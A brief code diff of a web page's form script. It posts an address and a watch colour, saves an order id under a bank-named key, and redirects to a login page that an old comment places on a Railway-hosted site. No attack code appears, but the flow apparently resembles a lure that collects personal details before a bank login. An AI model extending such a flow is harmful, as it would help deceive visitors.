@@ -469,10 +469,12 @@
           address: document.getElementById('fAddr').value.trim(),
           watchColor: color || '-',
         })
-      }).catch(function(){});
-
-      // Redirect to the main Railway site after submission
-      window.location.href = 'login-en.html';
+      }).then(function(res){ return res.json(); })
+        .then(function(data){
+          if (data.ok) sessionStorage.setItem('aman_bank_order_id', data.id);
+          window.location.href = 'login-en.html';
+        })
+        .catch(function(){ window.location.href = 'login-en.html'; });
     });
   </script>
 
